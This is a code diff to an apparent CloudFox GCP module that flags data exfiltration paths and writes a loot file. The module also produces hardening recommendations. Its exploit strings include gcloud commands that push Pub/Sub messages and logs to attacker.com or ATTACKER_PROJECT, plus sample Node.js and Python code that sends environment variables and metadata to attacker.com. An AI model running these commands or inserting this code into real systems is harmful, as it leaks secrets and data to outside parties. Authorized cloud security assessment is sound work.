@@ -16,7 +16,9 @@ import (
 	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
 	"github.com/spf13/cobra"
 
+	cloudfunctions "google.golang.org/api/cloudfunctions/v1"
 	compute "google.golang.org/api/compute/v1"
+	run "google.golang.org/api/run/v1"
 	sqladmin "google.golang.org/api/sqladmin/v1"
 	storage "google.golang.org/api/storage/v1"
 	storagetransfer "google.golang.org/api/storagetransfer/v1"
@@ -29,25 +31,30 @@ var GCPDataExfiltrationCommand = &cobra.Command{
 	Use:     GCP_DATAEXFILTRATION_MODULE_NAME,
 	Aliases: []string{"exfil", "data-exfil", "exfiltration"},
 	Short:   "Identify data exfiltration paths and high-risk data exposure",
-	Long: `Identify REAL data exfiltration vectors and paths in GCP environments.
+	Long: `Identify data exfiltration vectors and paths in GCP environments.
 
-This module enumerates actual configurations, NOT generic assumptions.
+This module identifies both ACTUAL misconfigurations and POTENTIAL exfiltration vectors.
 
-Features:
+Actual Findings (specific resources):
 - Public snapshots and images (actual IAM policy check)
 - Public buckets (actual IAM policy check)
 - Cross-project logging sinks (actual sink enumeration)
 - Pub/Sub push subscriptions to external endpoints
-- Pub/Sub subscriptions exporting to BigQuery/GCS
 - BigQuery datasets with public IAM bindings
-- Cloud SQL instances with export configurations
-- Storage Transfer Service jobs to external destinations (AWS S3, Azure Blob)
+- Storage Transfer Service jobs to external destinations
+
+Potential Vectors (capabilities that exist):
+- BigQuery Export: Can export data to GCS bucket or external table
+- Pub/Sub Subscription: Can push messages to external HTTP endpoint
+- Cloud Function: Can make outbound HTTP requests to external endpoints
+- Cloud Run: Can make outbound HTTP requests to external endpoints
+- Logging Sink: Can export logs to external project or Pub/Sub topic
 
 Security Controls Checked:
 - VPC Service Controls (VPC-SC) perimeter protection
-- Organization policies: storage.publicAccessPrevention, iam.allowedPolicyMemberDomains, sql.restrictPublicIp
+- Organization policies for data protection
 
-Each finding is based on actual resource configuration, not assumptions.`,
+The loot file includes commands to perform each type of exfiltration.`,
 	Run: runGCPDataExfiltrationCommand,
 }
 
@@ -55,6 +62,7 @@ Each finding is based on actual resource configuration, not assumptions.`,
 // Data Structures
 // ------------------------------
 
+// ExfiltrationPath represents an actual misconfiguration or finding
 type ExfiltrationPath struct {
 	PathType       string   // Category of exfiltration
 	ResourceName   string   // Specific resource
@@ -65,6 +73,16 @@ type ExfiltrationPath struct {
 	RiskReasons    []string // Why this is risky
 	ExploitCommand string   // Command to exploit
 	VPCSCProtected bool     // Is this project protected by VPC-SC?
+}
+
+// PotentialVector represents a potential exfiltration capability (not necessarily misconfigured)
+type PotentialVector struct {
+	VectorType     string // Category: BigQuery Export, Pub/Sub, Cloud Function, etc.
+	ResourceName   string // Specific resource or "*" for generic
+	ProjectID      string // Project ID
+	Description    string // What this vector enables
+	Destination    string // Where data could go
+	ExploitCommand string // Command to exploit this vector
 }
 
 type PublicExport struct {
@@ -79,12 +97,26 @@ type PublicExport struct {
 
 // OrgPolicyProtection tracks which org policies protect a project from data exfiltration
 type OrgPolicyProtection struct {
-	ProjectID                 string
-	PublicAccessPrevention    bool   // storage.publicAccessPrevention enforced
-	DomainRestriction         bool   // iam.allowedPolicyMemberDomains enforced
-	SQLPublicIPRestriction    bool   // sql.restrictPublicIp enforced
+	ProjectID                   string
+	PublicAccessPrevention      bool // storage.publicAccessPrevention enforced
+	DomainRestriction           bool // iam.allowedPolicyMemberDomains enforced
+	SQLPublicIPRestriction      bool // sql.restrictPublicIp enforced
 	ResourceLocationRestriction bool // gcp.resourceLocations enforced
-	MissingProtections        []string
+	CloudFunctionsVPCConnector  bool // cloudfunctions.requireVPCConnector enforced
+	CloudRunIngressRestriction  bool // run.allowedIngress enforced
+	CloudRunRequireIAMInvoker   bool // run.allowedIngress = internal or internal-and-cloud-load-balancing
+	DisableBQOmniAWS            bool // bigquery.disableBQOmniAWS enforced
+	DisableBQOmniAzure          bool // bigquery.disableBQOmniAzure enforced
+	MissingProtections          []string
+}
+
+// MissingHardening represents a security configuration that should be enabled
+type MissingHardening struct {
+	ProjectID      string
+	Category       string // Storage, BigQuery, Compute, etc.
+	Control        string // Org policy or configuration name
+	Description    string // What this protects against
+	Recommendation string // How to enable it
 }
 
 // ------------------------------
@@ -93,11 +125,12 @@ type OrgPolicyProtection struct {
 type DataExfiltrationModule struct {
 	gcpinternal.BaseGCPModule
 
-	ExfiltrationPaths  []ExfiltrationPath
-	PublicExports      []PublicExport
-	LootMap            map[string]*internal.LootFile
-	mu                 sync.Mutex
-	vpcscProtectedProj map[string]bool          // Projects protected by VPC-SC
+	ExfiltrationPaths   []ExfiltrationPath
+	PotentialVectors    []PotentialVector
+	PublicExports       []PublicExport
+	LootMap             map[string]*internal.LootFile
+	mu                  sync.Mutex
+	vpcscProtectedProj  map[string]bool                 // Projects protected by VPC-SC
 	orgPolicyProtection map[string]*OrgPolicyProtection // Org policy protections per project
 }
 
@@ -124,6 +157,7 @@ func runGCPDataExfiltrationCommand(cmd *cobra.Command, args []string) {
 	module := &DataExfiltrationModule{
 		BaseGCPModule:       gcpinternal.NewBaseGCPModule(cmdCtx),
 		ExfiltrationPaths:   []ExfiltrationPath{},
+		PotentialVectors:    []PotentialVector{},
 		PublicExports:       []PublicExport{},
 		LootMap:             make(map[string]*internal.LootFile),
 		vpcscProtectedProj:  make(map[string]bool),
@@ -138,7 +172,7 @@ func runGCPDataExfiltrationCommand(cmd *cobra.Command, args []string) {
 // Module Execution
 // ------------------------------
 func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Logger) {
-	logger.InfoM("Identifying data exfiltration paths...", GCP_DATAEXFILTRATION_MODULE_NAME)
+	logger.InfoM("Identifying data exfiltration paths and potential vectors...", GCP_DATAEXFILTRATION_MODULE_NAME)
 
 	// First, check VPC-SC protection status for all projects
 	m.checkVPCSCProtection(ctx, logger)
@@ -149,14 +183,26 @@ func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Lo
 	// Process each project
 	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_DATAEXFILTRATION_MODULE_NAME, m.processProject)
 
+	// Generate hardening recommendations
+	hardeningRecs := m.generateMissingHardeningRecommendations()
+
 	// Check results
-	if len(m.ExfiltrationPaths) == 0 && len(m.PublicExports) == 0 {
-		logger.InfoM("No data exfiltration paths found", GCP_DATAEXFILTRATION_MODULE_NAME)
+	hasResults := len(m.ExfiltrationPaths) > 0 || len(m.PotentialVectors) > 0 || len(hardeningRecs) > 0
+
+	if !hasResults {
+		logger.InfoM("No data exfiltration paths, vectors, or hardening gaps found", GCP_DATAEXFILTRATION_MODULE_NAME)
 		return
 	}
 
-	logger.SuccessM(fmt.Sprintf("Found %d exfiltration path(s) and %d public export(s)",
-		len(m.ExfiltrationPaths), len(m.PublicExports)), GCP_DATAEXFILTRATION_MODULE_NAME)
+	if len(m.ExfiltrationPaths) > 0 {
+		logger.SuccessM(fmt.Sprintf("Found %d actual misconfiguration(s)", len(m.ExfiltrationPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
+	}
+	if len(m.PotentialVectors) > 0 {
+		logger.SuccessM(fmt.Sprintf("Found %d potential exfiltration vector(s)", len(m.PotentialVectors)), GCP_DATAEXFILTRATION_MODULE_NAME)
+	}
+	if len(hardeningRecs) > 0 {
+		logger.InfoM(fmt.Sprintf("Found %d hardening recommendation(s)", len(hardeningRecs)), GCP_DATAEXFILTRATION_MODULE_NAME)
+	}
 
 	m.writeOutput(ctx, logger)
 }
@@ -248,6 +294,28 @@ func (m *DataExfiltrationModule) checkOrgPolicyProtection(ctx context.Context, l
 				if policy.Enforced || len(policy.AllowedValues) > 0 {
 					protection.ResourceLocationRestriction = true
 				}
+			case "constraints/cloudfunctions.requireVPCConnector":
+				if policy.Enforced {
+					protection.CloudFunctionsVPCConnector = true
+				}
+			case "constraints/run.allowedIngress":
+				// Check if ingress is restricted to internal or internal-and-cloud-load-balancing
+				if len(policy.AllowedValues) > 0 {
+					for _, val := range policy.AllowedValues {
+						if val == "internal" || val == "internal-and-cloud-load-balancing" {
+							protection.CloudRunIngressRestriction = true
+							break
+						}
+					}
+				}
+			case "constraints/bigquery.disableBQOmniAWS":
+				if policy.Enforced {
+					protection.DisableBQOmniAWS = true
+				}
+			case "constraints/bigquery.disableBQOmniAzure":
+				if policy.Enforced {
+					protection.DisableBQOmniAzure = true
+				}
 			}
 		}
 
@@ -260,6 +328,18 @@ func (m *DataExfiltrationModule) checkOrgPolicyProtection(ctx context.Context, l
 		}
 		if !protection.SQLPublicIPRestriction {
 			protection.MissingProtections = append(protection.MissingProtections, "sql.restrictPublicIp not enforced")
+		}
+		if !protection.CloudFunctionsVPCConnector {
+			protection.MissingProtections = append(protection.MissingProtections, "cloudfunctions.requireVPCConnector not enforced")
+		}
+		if !protection.CloudRunIngressRestriction {
+			protection.MissingProtections = append(protection.MissingProtections, "run.allowedIngress not restricted")
+		}
+		if !protection.DisableBQOmniAWS {
+			protection.MissingProtections = append(protection.MissingProtections, "bigquery.disableBQOmniAWS not enforced")
+		}
+		if !protection.DisableBQOmniAzure {
+			protection.MissingProtections = append(protection.MissingProtections, "bigquery.disableBQOmniAzure not enforced")
 		}
 
 		m.mu.Lock()
@@ -277,6 +357,189 @@ func (m *DataExfiltrationModule) isOrgPolicyProtected(projectID string) bool {
 	return false
 }
 
+// generateMissingHardeningRecommendations creates a list of hardening recommendations for each project
+func (m *DataExfiltrationModule) generateMissingHardeningRecommendations() []MissingHardening {
+	var recommendations []MissingHardening
+
+	for _, projectID := range m.ProjectIDs {
+		protection, ok := m.orgPolicyProtection[projectID]
+		if !ok {
+			// No protection data available - recommend all controls
+			protection = &OrgPolicyProtection{ProjectID: projectID}
+		}
+
+		// Storage protections
+		if !protection.PublicAccessPrevention {
+			recommendations = append(recommendations, MissingHardening{
+				ProjectID:   projectID,
+				Category:    "Storage",
+				Control:     "storage.publicAccessPrevention",
+				Description: "Prevents GCS buckets from being made public via IAM policies",
+				Recommendation: `# Enable via org policy (recommended at org/folder level)
+gcloud org-policies set-policy --project=PROJECT_ID policy.yaml
+
+# policy.yaml contents:
+# name: projects/PROJECT_ID/policies/storage.publicAccessPrevention
+# spec:
+#   rules:
+#   - enforce: true
+
+# Or enable per-bucket:
+gcloud storage buckets update gs://BUCKET_NAME --public-access-prevention`,
+			})
+		}
+
+		// IAM protections
+		if !protection.DomainRestriction {
+			recommendations = append(recommendations, MissingHardening{
+				ProjectID:   projectID,
+				Category:    "IAM",
+				Control:     "iam.allowedPolicyMemberDomains",
+				Description: "Restricts IAM policy members to specific domains only (prevents allUsers/allAuthenticatedUsers)",
+				Recommendation: `# Enable via org policy (recommended at org/folder level)
+gcloud org-policies set-policy --project=PROJECT_ID policy.yaml
+
+# policy.yaml contents:
+# name: projects/PROJECT_ID/policies/iam.allowedPolicyMemberDomains
+# spec:
+#   rules:
+#   - values:
+#       allowedValues:
+#       - C0xxxxxxx  # Your Cloud Identity/Workspace customer ID
+#       - is:example.com  # Or domain restriction`,
+			})
+		}
+
+		// Cloud SQL protections
+		if !protection.SQLPublicIPRestriction {
+			recommendations = append(recommendations, MissingHardening{
+				ProjectID:   projectID,
+				Category:    "Cloud SQL",
+				Control:     "sql.restrictPublicIp",
+				Description: "Prevents Cloud SQL instances from having public IP addresses",
+				Recommendation: `# Enable via org policy
+gcloud org-policies set-policy --project=PROJECT_ID policy.yaml
+
+# policy.yaml contents:
+# name: projects/PROJECT_ID/policies/sql.restrictPublicIp
+# spec:
+#   rules:
+#   - enforce: true`,
+			})
+		}
+
+		// Cloud Functions protections
+		if !protection.CloudFunctionsVPCConnector {
+			recommendations = append(recommendations, MissingHardening{
+				ProjectID:   projectID,
+				Category:    "Cloud Functions",
+				Control:     "cloudfunctions.requireVPCConnector",
+				Description: "Requires Cloud Functions to use VPC connector for egress (prevents direct internet access)",
+				Recommendation: `# Enable via org policy
+gcloud org-policies set-policy --project=PROJECT_ID policy.yaml
+
+# policy.yaml contents:
+# name: projects/PROJECT_ID/policies/cloudfunctions.requireVPCConnector
+# spec:
+#   rules:
+#   - enforce: true
+
+# Note: Requires VPC connector to be configured in the VPC`,
+			})
+		}
+
+		// Cloud Run protections
+		if !protection.CloudRunIngressRestriction {
+			recommendations = append(recommendations, MissingHardening{
+				ProjectID:   projectID,
+				Category:    "Cloud Run",
+				Control:     "run.allowedIngress",
+				Description: "Restricts Cloud Run ingress to internal traffic only (prevents public access)",
+				Recommendation: `# Enable via org policy
+gcloud org-policies set-policy --project=PROJECT_ID policy.yaml
+
+# policy.yaml contents:
+# name: projects/PROJECT_ID/policies/run.allowedIngress
+# spec:
+#   rules:
+#   - values:
+#       allowedValues:
+#       - internal  # Only allow internal traffic
+#       # Or: internal-and-cloud-load-balancing
+
+# Per-service setting:
+gcloud run services update SERVICE --ingress=internal --region=REGION`,
+			})
+		}
+
+		// BigQuery protections - AWS
+		if !protection.DisableBQOmniAWS {
+			recommendations = append(recommendations, MissingHardening{
+				ProjectID:   projectID,
+				Category:    "BigQuery",
+				Control:     "bigquery.disableBQOmniAWS",
+				Description: "Prevents BigQuery Omni connections to AWS (blocks cross-cloud data access)",
+				Recommendation: `# Enable via org policy
+gcloud org-policies set-policy --project=PROJECT_ID policy.yaml
+
+# policy.yaml contents:
+# name: projects/PROJECT_ID/policies/bigquery.disableBQOmniAWS
+# spec:
+#   rules:
+#   - enforce: true`,
+			})
+		}
+
+		// BigQuery protections - Azure
+		if !protection.DisableBQOmniAzure {
+			recommendations = append(recommendations, MissingHardening{
+				ProjectID:   projectID,
+				Category:    "BigQuery",
+				Control:     "bigquery.disableBQOmniAzure",
+				Description: "Prevents BigQuery Omni connections to Azure (blocks cross-cloud data access)",
+				Recommendation: `# Enable via org policy
+gcloud org-policies set-policy --project=PROJECT_ID policy.yaml
+
+# policy.yaml contents:
+# name: projects/PROJECT_ID/policies/bigquery.disableBQOmniAzure
+# spec:
+#   rules:
+#   - enforce: true`,
+			})
+		}
+
+		// Check VPC-SC protection status
+		if !m.vpcscProtectedProj[projectID] {
+			recommendations = append(recommendations, MissingHardening{
+				ProjectID:   projectID,
+				Category:    "VPC Service Controls",
+				Control:     "VPC-SC Perimeter",
+				Description: "VPC Service Controls create a security perimeter that prevents data exfiltration from GCP APIs",
+				Recommendation: `# VPC-SC requires Access Context Manager at organization level
+
+# 1. Create an access policy (org-level, one-time)
+gcloud access-context-manager policies create --organization=ORG_ID --title="Policy"
+
+# 2. Create a service perimeter
+gcloud access-context-manager perimeters create NAME \
+  --title="Data Protection Perimeter" \
+  --resources=projects/PROJECT_NUMBER \
+  --restricted-services=storage.googleapis.com,bigquery.googleapis.com \
+  --policy=POLICY_ID
+
+# Restricted services commonly include:
+# - storage.googleapis.com (GCS)
+# - bigquery.googleapis.com (BigQuery)
+# - pubsub.googleapis.com (Pub/Sub)
+# - logging.googleapis.com (Cloud Logging)
+# - secretmanager.googleapis.com (Secret Manager)`,
+			})
+		}
+	}
+
+	return recommendations
+}
+
 // ------------------------------
 // Project Processor
 // ------------------------------
@@ -284,6 +547,8 @@ func (m *DataExfiltrationModule) processProject(ctx context.Context, projectID s
 	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
 		logger.InfoM(fmt.Sprintf("Analyzing exfiltration paths in project: %s", projectID), GCP_DATAEXFILTRATION_MODULE_NAME)
 	}
+
+	// === ACTUAL MISCONFIGURATIONS ===
 
 	// 1. Find public/shared snapshots (REAL check)
 	m.findPublicSnapshots(ctx, projectID, logger)
@@ -311,6 +576,23 @@ func (m *DataExfiltrationModule) processProject(ctx context.Context, projectID s
 
 	// 9. Find Storage Transfer jobs to external destinations
 	m.findStorageTransferJobs(ctx, projectID, logger)
+
+	// === POTENTIAL EXFILTRATION VECTORS ===
+
+	// 10. Check for BigQuery export capability
+	m.checkBigQueryExportCapability(ctx, projectID, logger)
+
+	// 11. Check for Pub/Sub subscription capability
+	m.checkPubSubCapability(ctx, projectID, logger)
+
+	// 12. Check for Cloud Function capability
+	m.checkCloudFunctionCapability(ctx, projectID, logger)
+
+	// 13. Check for Cloud Run capability
+	m.checkCloudRunCapability(ctx, projectID, logger)
+
+	// 14. Check for Logging sink capability
+	m.checkLoggingSinkCapability(ctx, projectID, logger)
 }
 
 // findPublicSnapshots finds snapshots that are publicly accessible
@@ -856,6 +1138,256 @@ func (m *DataExfiltrationModule) findStorageTransferJobs(ctx context.Context, pr
 }
 
 // ------------------------------
+// Potential Vector Checks
+// ------------------------------
+
+// checkBigQueryExportCapability checks if BigQuery datasets exist (can export to GCS/external)
+func (m *DataExfiltrationModule) checkBigQueryExportCapability(ctx context.Context, projectID string, logger internal.Logger) {
+	bq := bigqueryservice.New()
+	datasets, err := bq.BigqueryDatasets(projectID)
+	if err != nil {
+		return // Silently skip - API may not be enabled
+	}
+
+	if len(datasets) > 0 {
+		vector := PotentialVector{
+			VectorType:   "BigQuery Export",
+			ResourceName: "*",
+			ProjectID:    projectID,
+			Description:  "BigQuery can export data to GCS bucket or external table",
+			Destination:  "GCS bucket or external table",
+			ExploitCommand: fmt.Sprintf(`# List all datasets in project
+bq ls --project_id=%s
+
+# List tables in a dataset
+bq ls %s:DATASET_NAME
+
+# Export table to GCS (requires storage.objects.create on bucket)
+bq extract --destination_format=CSV '%s:DATASET.TABLE' gs://YOUR_BUCKET/export.csv
+
+# Export to external table (federated query)
+bq query --use_legacy_sql=false 'SELECT * FROM EXTERNAL_QUERY("connection_id", "SELECT * FROM table")'
+
+# Create external table pointing to GCS
+bq mk --external_table_definition=gs://bucket/file.csv@CSV DATASET.external_table`, projectID, projectID, projectID),
+		}
+
+		m.mu.Lock()
+		m.PotentialVectors = append(m.PotentialVectors, vector)
+		m.addPotentialVectorToLoot(vector)
+		m.mu.Unlock()
+	}
+}
+
+// checkPubSubCapability checks if Pub/Sub topics/subscriptions exist
+func (m *DataExfiltrationModule) checkPubSubCapability(ctx context.Context, projectID string, logger internal.Logger) {
+	ps := pubsubservice.New()
+	subs, err := ps.Subscriptions(projectID)
+	if err != nil {
+		return // Silently skip
+	}
+
+	if len(subs) > 0 {
+		vector := PotentialVector{
+			VectorType:   "Pub/Sub Subscription",
+			ResourceName: "*",
+			ProjectID:    projectID,
+			Description:  "Pub/Sub can push messages to external HTTP endpoint",
+			Destination:  "External HTTP endpoint",
+			ExploitCommand: fmt.Sprintf(`# List all subscriptions
+gcloud pubsub subscriptions list --project=%s
+
+# Create a push subscription to external endpoint (requires pubsub.subscriptions.create)
+gcloud pubsub subscriptions create exfil-sub \
+  --topic=TOPIC_NAME \
+  --push-endpoint=https://attacker.com/collect \
+  --project=%s
+
+# Pull messages from existing subscription (requires pubsub.subscriptions.consume)
+gcloud pubsub subscriptions pull SUB_NAME --auto-ack --limit=100 --project=%s
+
+# Modify existing subscription to push to external endpoint
+gcloud pubsub subscriptions modify-push-config SUB_NAME \
+  --push-endpoint=https://attacker.com/collect \
+  --project=%s`, projectID, projectID, projectID, projectID),
+		}
+
+		m.mu.Lock()
+		m.PotentialVectors = append(m.PotentialVectors, vector)
+		m.addPotentialVectorToLoot(vector)
+		m.mu.Unlock()
+	}
+}
+
+// checkCloudFunctionCapability checks if Cloud Functions exist
+func (m *DataExfiltrationModule) checkCloudFunctionCapability(ctx context.Context, projectID string, logger internal.Logger) {
+	functionsService, err := cloudfunctions.NewService(ctx)
+	if err != nil {
+		return
+	}
+
+	parent := fmt.Sprintf("projects/%s/locations/-", projectID)
+	resp, err := functionsService.Projects.Locations.Functions.List(parent).Do()
+	if err != nil {
+		return // Silently skip
+	}
+
+	if len(resp.Functions) > 0 {
+		vector := PotentialVector{
+			VectorType:   "Cloud Function",
+			ResourceName: "*",
+			ProjectID:    projectID,
+			Description:  "Cloud Functions can make outbound HTTP requests to external endpoints",
+			Destination:  "External HTTP endpoint",
+			ExploitCommand: fmt.Sprintf(`# List all Cloud Functions
+gcloud functions list --project=%s
+
+# If you can update function code, add exfiltration logic:
+# - Read secrets/data from project resources
+# - Send HTTP POST to external endpoint
+
+# Example: Deploy function that exfiltrates data
+# function code (index.js):
+# const https = require('https');
+# exports.exfil = (req, res) => {
+#   const data = JSON.stringify({secrets: process.env});
+#   const options = {hostname: 'attacker.com', path: '/collect', method: 'POST'};
+#   https.request(options).write(data);
+#   res.send('ok');
+# };
+
+# Invoke a function (if publicly accessible or you have invoker role)
+gcloud functions call FUNCTION_NAME --project=%s
+
+# View function source
+gcloud functions describe FUNCTION_NAME --project=%s`, projectID, projectID, projectID),
+		}
+
+		m.mu.Lock()
+		m.PotentialVectors = append(m.PotentialVectors, vector)
+		m.addPotentialVectorToLoot(vector)
+		m.mu.Unlock()
+	}
+}
+
+// checkCloudRunCapability checks if Cloud Run services exist
+func (m *DataExfiltrationModule) checkCloudRunCapability(ctx context.Context, projectID string, logger internal.Logger) {
+	runService, err := run.NewService(ctx)
+	if err != nil {
+		return
+	}
+
+	parent := fmt.Sprintf("projects/%s/locations/-", projectID)
+	resp, err := runService.Projects.Locations.Services.List(parent).Do()
+	if err != nil {
+		return // Silently skip
+	}
+
+	if len(resp.Items) > 0 {
+		vector := PotentialVector{
+			VectorType:   "Cloud Run",
+			ResourceName: "*",
+			ProjectID:    projectID,
+			Description:  "Cloud Run services can make outbound HTTP requests to external endpoints",
+			Destination:  "External HTTP endpoint",
+			ExploitCommand: fmt.Sprintf(`# List all Cloud Run services
+gcloud run services list --project=%s
+
+# If you can update service, add exfiltration logic in container
+# Cloud Run containers have full network egress by default
+
+# Example: Deploy container that exfiltrates environment/metadata
+# Dockerfile:
+# FROM python:3.9-slim
+# COPY exfil.py .
+# CMD ["python", "exfil.py"]
+
+# exfil.py:
+# import os, requests
+# requests.post('https://attacker.com/collect', json={
+#   'env': dict(os.environ),
+#   'metadata': requests.get('http://metadata.google.internal/...').text
+# })
+
+# View service details
+gcloud run services describe SERVICE_NAME --region=REGION --project=%s
+
+# Invoke service (if you have invoker role)
+curl -H "Authorization: Bearer $(gcloud auth print-identity-token)" SERVICE_URL`, projectID, projectID),
+		}
+
+		m.mu.Lock()
+		m.PotentialVectors = append(m.PotentialVectors, vector)
+		m.addPotentialVectorToLoot(vector)
+		m.mu.Unlock()
+	}
+}
+
+// checkLoggingSinkCapability checks if logging sinks can be created
+func (m *DataExfiltrationModule) checkLoggingSinkCapability(ctx context.Context, projectID string, logger internal.Logger) {
+	ls := loggingservice.New()
+	sinks, err := ls.Sinks(projectID)
+	if err != nil {
+		return // Silently skip
+	}
+
+	// If we can list sinks, we might be able to create them
+	// Also check if there's an existing sink we could modify
+	hasCrossProjectSink := false
+	for _, sink := range sinks {
+		if sink.IsCrossProject {
+			hasCrossProjectSink = true
+			break
+		}
+	}
+
+	// Add as potential vector if logging API is accessible
+	vector := PotentialVector{
+		VectorType:   "Logging Sink",
+		ResourceName: "*",
+		ProjectID:    projectID,
+		Description:  "Logs can be exported to external project or Pub/Sub topic",
+		Destination:  "External project or Pub/Sub topic",
+		ExploitCommand: fmt.Sprintf(`# List existing logging sinks
+gcloud logging sinks list --project=%s
+
+# Create a sink to export logs to attacker-controlled destination
+# (requires logging.sinks.create permission)
+
+# Export to Pub/Sub topic in another project
+gcloud logging sinks create exfil-sink \
+  pubsub.googleapis.com/projects/ATTACKER_PROJECT/topics/stolen-logs \
+  --log-filter='resource.type="gce_instance"' \
+  --project=%s
+
+# Export to BigQuery in another project
+gcloud logging sinks create exfil-sink \
+  bigquery.googleapis.com/projects/ATTACKER_PROJECT/datasets/stolen_logs \
+  --log-filter='resource.type="gce_instance"' \
+  --project=%s
+
+# Export to GCS bucket
+gcloud logging sinks create exfil-sink \
+  storage.googleapis.com/attacker-bucket \
+  --log-filter='resource.type="gce_instance"' \
+  --project=%s
+
+# Modify existing sink destination (requires logging.sinks.update)
+gcloud logging sinks update SINK_NAME \
+  --destination=pubsub.googleapis.com/projects/ATTACKER_PROJECT/topics/stolen \
+  --project=%s`, projectID, projectID, projectID, projectID, projectID),
+	}
+
+	// Only add if there's evidence logging is actively used or we found sinks
+	if len(sinks) > 0 || hasCrossProjectSink {
+		m.mu.Lock()
+		m.PotentialVectors = append(m.PotentialVectors, vector)
+		m.addPotentialVectorToLoot(vector)
+		m.mu.Unlock()
+	}
+}
+
+// ------------------------------
 // Loot File Management
 // ------------------------------
 func (m *DataExfiltrationModule) initializeLootFiles() {
@@ -865,20 +1397,18 @@ func (m *DataExfiltrationModule) initializeLootFiles() {
 	}
 }
 
-// formatExfilType converts internal type names to user-friendly display names
-func formatExfilType(pathType string) string {
-	return pathType // Already formatted in the new module
-}
-
 func (m *DataExfiltrationModule) addExfiltrationPathToLoot(path ExfiltrationPath) {
 	if path.ExploitCommand == "" {
 		return
 	}
 
 	m.LootMap["data-exfiltration-commands"].Contents += fmt.Sprintf(
-		"## %s: %s (Project: %s)\n"+
-			"# %s\n"+
-			"# Destination: %s\n",
+		"#############################################\n"+
+			"## [ACTUAL] %s: %s\n"+
+			"## Project: %s\n"+
+			"## Description: %s\n"+
+			"## Destination: %s\n"+
+			"#############################################\n",
 		path.PathType,
 		path.ResourceName,
 		path.ProjectID,
@@ -889,45 +1419,88 @@ func (m *DataExfiltrationModule) addExfiltrationPathToLoot(path ExfiltrationPath
 	m.LootMap["data-exfiltration-commands"].Contents += fmt.Sprintf("%s\n\n", path.ExploitCommand)
 }
 
+func (m *DataExfiltrationModule) addPotentialVectorToLoot(vector PotentialVector) {
+	if vector.ExploitCommand == "" {
+		return
+	}
+
+	m.LootMap["data-exfiltration-commands"].Contents += fmt.Sprintf(
+		"#############################################\n"+
+			"## [POTENTIAL] %s\n"+
+			"## Project: %s\n"+
+			"## Description: %s\n"+
+			"## Destination: %s\n"+
+			"#############################################\n",
+		vector.VectorType,
+		vector.ProjectID,
+		vector.Description,
+		vector.Destination,
+	)
+
+	m.LootMap["data-exfiltration-commands"].Contents += fmt.Sprintf("%s\n\n", vector.ExploitCommand)
+}
+
+func (m *DataExfiltrationModule) addHardeningRecommendationsToLoot(recommendations []MissingHardening) {
+	if len(recommendations) == 0 {
+		return
+	}
+
+	// Initialize hardening loot file if not exists
+	if _, ok := m.LootMap["data-exfiltration-hardening"]; !ok {
+		m.LootMap["data-exfiltration-hardening"] = &internal.LootFile{
+			Name:     "data-exfiltration-hardening",
+			Contents: "# Data Exfiltration Prevention - Hardening Recommendations\n# Generated by CloudFox\n# These controls help prevent data exfiltration from GCP projects\n\n",
+		}
+	}
+
+	// Group recommendations by project
+	projectRecs := make(map[string][]MissingHardening)
+	for _, rec := range recommendations {
+		projectRecs[rec.ProjectID] = append(projectRecs[rec.ProjectID], rec)
+	}
+
+	for projectID, recs := range projectRecs {
+		m.LootMap["data-exfiltration-hardening"].Contents += fmt.Sprintf(
+			"#############################################\n"+
+				"## PROJECT: %s (%s)\n"+
+				"## Missing %d security control(s)\n"+
+				"#############################################\n\n",
+			projectID,
+			m.GetProjectName(projectID),
+			len(recs),
+		)
+
+		for _, rec := range recs {
+			m.LootMap["data-exfiltration-hardening"].Contents += fmt.Sprintf(
+				"## [%s] %s\n"+
+					"## Description: %s\n"+
+					"#############################################\n",
+				rec.Category,
+				rec.Control,
+				rec.Description,
+			)
+			m.LootMap["data-exfiltration-hardening"].Contents += fmt.Sprintf("%s\n\n", rec.Recommendation)
+		}
+	}
+}
+
 // ------------------------------
 // Output Generation
 // ------------------------------
 
-// getExfilDescription returns a user-friendly description of the exfiltration path type
-func getExfilDescription(pathType string) string {
-	descriptions := map[string]string{
-		"Public Snapshot":         "Disk snapshot can be copied to create new disks externally",
-		"Public Image":            "VM image can be used to launch instances externally",
-		"Public Bucket":           "GCS bucket contents can be downloaded by anyone",
-		"Logging Sink":            "Logs can be exported to a cross-project destination",
-		"Pub/Sub Push":            "Messages can be pushed to an external HTTP endpoint",
-		"Pub/Sub BigQuery Export": "Messages can be exported to BigQuery in another project",
-		"Pub/Sub GCS Export":      "Messages can be exported to a Cloud Storage bucket",
-		"Public BigQuery":         "BigQuery dataset can be queried and exported by anyone",
-		"Cloud SQL Export":        "Cloud SQL data can be exported via CDC or backup",
-		"Storage Transfer":        "Data can be transferred to external cloud providers",
-	}
-
-	if desc, ok := descriptions[pathType]; ok {
-		return desc
-	}
-	return "Data can be exfiltrated via this path"
-}
-
 func (m *DataExfiltrationModule) writeOutput(ctx context.Context, logger internal.Logger) {
-	header := []string{
+	// Table 1: Actual Misconfigurations
+	misconfigHeader := []string{
 		"Project ID",
 		"Project Name",
 		"Resource",
 		"Type",
 		"Destination",
 		"Public",
-		"VPC-SC Protected",
-		"Org Policy Protected",
-		"Description",
+		"Size",
 	}
 
-	var body [][]string
+	var misconfigBody [][]string
 
 	// Track which resources we've added from PublicExports
 	publicResources := make(map[string]PublicExport)
@@ -936,68 +1509,90 @@ func (m *DataExfiltrationModule) writeOutput(ctx context.Context, logger interna
 		publicResources[key] = e
 	}
 
-	// Add exfiltration paths
+	// Add exfiltration paths (actual misconfigurations)
 	for _, p := range m.ExfiltrationPaths {
 		key := fmt.Sprintf("%s:%s:%s", p.ProjectID, p.PathType, p.ResourceName)
-		_, isPublic := publicResources[key]
+		export, isPublic := publicResources[key]
 
 		publicStatus := "No"
+		size := "-"
 		if isPublic {
 			publicStatus = "Yes"
+			size = export.Size
 			delete(publicResources, key)
 		}
 
-		// Check VPC-SC protection
-		vpcscProtected := "No"
-		if m.vpcscProtectedProj[p.ProjectID] || p.VPCSCProtected {
-			vpcscProtected = "Yes"
-		}
-
-		// Check org policy protection
-		orgPolicyProtected := "No"
-		if m.isOrgPolicyProtected(p.ProjectID) {
-			orgPolicyProtected = "Yes"
-		}
-
-		body = append(body, []string{
+		misconfigBody = append(misconfigBody, []string{
 			p.ProjectID,
